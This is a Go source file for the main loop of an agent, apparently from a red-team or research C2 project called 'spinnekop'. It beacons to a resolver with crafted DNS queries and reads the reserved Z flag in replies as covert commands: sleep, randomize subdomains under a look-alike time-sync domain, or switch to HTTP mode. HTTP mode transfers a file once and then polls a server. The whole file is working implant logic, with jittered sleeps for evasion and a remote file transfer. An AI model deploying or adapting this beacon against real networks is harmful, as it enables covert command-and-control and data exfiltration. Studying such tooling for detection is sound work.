package main

import (
	"context"
	"fmt"
	"github.com/faanross/spinnekop/internal/crafter"
	"github.com/faanross/spinnekop/internal/httpclient"
	"github.com/faanross/spinnekop/internal/network"
	"github.com/faanross/spinnekop/internal/subdomain"
	"github.com/faanross/spinnekop/internal/utils"
	"github.com/faanross/spinnekop/internal/visualizer"
	"github.com/faanross/spinnekop/internal/zhandler"
	"github.com/fatih/color"
	"github.com/miekg/dns"
	"math/rand"
	"os"
	"os/signal"
	"syscall"
	"time"
)

var Delay = 5   // seconds
var Jitter = 50 // percentage (0-100)
var useRandomSubdomain bool

func main() {
	// Load our config from config.go
	dnsRequest := getEmbeddedAgentConfig()

	// Keep the resolver determination outside the loop
	finalResolver, err := utils.DetermineResolver(dnsRequest.Resolver)
	if err != nil {
		fmt.Printf("Error determining resolver: %v\n", err)
		return
	}

	// Set up signal handling
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	// Start send loop in goroutine
	httpMode := make(chan struct{})
	go func() {
		var lastZValue int // track Z-value state
		for {
			select {
			case <-ctx.Done():
				return
			default:
				// Create fresh DNS request for each iteration
				currentRequest := getEmbeddedAgentConfig()

				// Modify subdomain if needed
				if useRandomSubdomain {
					randomSub := subdomain.GenerateRandom()
					currentRequest.Question.Name = randomSub + ".timeserversync.com."
					fmt.Printf("Using random subdomain: %s\n", currentRequest.Question.Name)
				}

				// Create DNS message
				dnsMsg, err := crafter.BuildDNSRequest(currentRequest)
				if err != nil {
					fmt.Printf("Error building DNS request: %v\n", err)
					continue
				}

				// Pack the message
				packedMsg, err := dnsMsg.Pack()
				if err != nil {
					fmt.Printf("Error packing message: %v\n", err)
					continue
				}

				// Apply Z flag override
				err = crafter.ApplyManualOverride(packedMsg, currentRequest.Header)
				if err != nil {
					fmt.Printf("Error applying manual overrides: %v\n", err)
					continue
				}

				// Visualize packet
				visualizer.VisualizePacket(packedMsg)

				// Send Packet and Receive Response
				responseBytes, err := network.SendAndReceivePacket(packedMsg, finalResolver)
				if err != nil {
					fmt.Printf("\nError during network communication: %v\n", err)
				} else {
					// Process and Display the Response
					color.Green("\n--- DNS Server Response ---")
					var responseMsg dns.Msg
					err = responseMsg.Unpack(responseBytes)
					if err != nil {
						fmt.Printf("Error unpacking response packet: %v\n", err)
						visualizer.VisualizePacket(responseBytes)
					} else {
						fmt.Println(responseMsg.String())
						visualizer.VisualizePacket(responseBytes)
					}

					// Extract Z-value and call dispatcher
					if len(responseBytes) >= 4 {
						flags := uint16(responseBytes[2])<<8 | uint16(responseBytes[3])
						zValue := int((flags >> 4) & 0x07)
						lastZValue = zValue
						zValueDispatcher(zValue, httpMode)
					}
				}

				// Calculate sleep duration
				var sleepDuration time.Duration

				// Check if we should do one-hour sleep
				if lastZValue == 1 {
					shouldSleep, duration := zhandler.HandleZOne()
					if shouldSleep {
						sleepDuration = duration
						fmt.Printf("\n⏰ Z=1 received: Sleeping for 1 hour...\n")
					} else {
						// Normal jitter calculation
						jitterRange := float64(Delay) * float64(Jitter) / 100.0
						minSleep := float64(Delay) - jitterRange
						maxSleep := float64(Delay) + jitterRange
						sleepSeconds := minSleep + rand.Float64()*(maxSleep-minSleep)
						sleepDuration = time.Duration(sleepSeconds * float64(time.Second))
						fmt.Printf("\n💤 Sleeping for %.2f seconds...\n", sleepSeconds)
					}
				} else {
					// Normal jitter calculation
					jitterRange := float64(Delay) * float64(Jitter) / 100.0
					minSleep := float64(Delay) - jitterRange
					maxSleep := float64(Delay) + jitterRange
					sleepSeconds := minSleep + rand.Float64()*(maxSleep-minSleep)
					sleepDuration = time.Duration(sleepSeconds * float64(time.Second))
					fmt.Printf("\n💤 Sleeping for %.2f seconds...\n", sleepSeconds)
				}

				select {
				case <-ctx.Done():
					return
				case <-time.After(sleepDuration):
					// Continue to next iteration
				}

				// Check if we should switch to HTTP mode
				select {
				case <-httpMode:
					fmt.Println("Switching to HTTP mode...")

					// Transfer file once
					httpclient.TransferFile()

					// Start HTTP loop with same timing
					for {
						select {
						case <-ctx.Done():
							return
						default:
							httpclient.ContactServer()

							// Same jitter calculation
							jitterRange := float64(Delay) * float64(Jitter) / 100.0
							minSleep := float64(Delay) - jitterRange
							maxSleep := float64(Delay) + jitterRange
							sleepSeconds := minSleep + rand.Float64()*(maxSleep-minSleep)

							fmt.Printf("\n💤 HTTP mode: Sleeping for %.2f seconds...\n", sleepSeconds)

							select {
							case <-ctx.Done():
								return
							case <-time.After(time.Duration(sleepSeconds * float64(time.Second))):
								// Continue HTTP loop
							}
						}
					}
				default:
					// Continue DNS loop
				}
			}
		}
	}()

	// Wait for shutdown signal
	<-sigChan
	fmt.Println("\n🛑 Shutting down...")
	cancel()
	time.Sleep(100 * time.Millisecond) // Brief pause for cleanup
}

// zValueDispatcher performs actions based on the Z-value received
func zValueDispatcher(z int, httpMode chan<- struct{}) {
	switch z {
	case 0:
		fmt.Println("The Z-value of 0 was received")
	case 1:
		fmt.Println("The Z-value of 1 was received")
	case 2:
		fmt.Println("The Z-value of 2 was received")
		useRandomSubdomain = true
	case 3:
		fmt.Println("The Z-value of 3 was received")
		if httpclient.ContactServer() {
			fmt.Println("HTTP connection established, switching to HTTP mode")
			close(httpMode)
		}
	default:
		fmt.Println("The Z-value of 4-8 was received")
	}
}
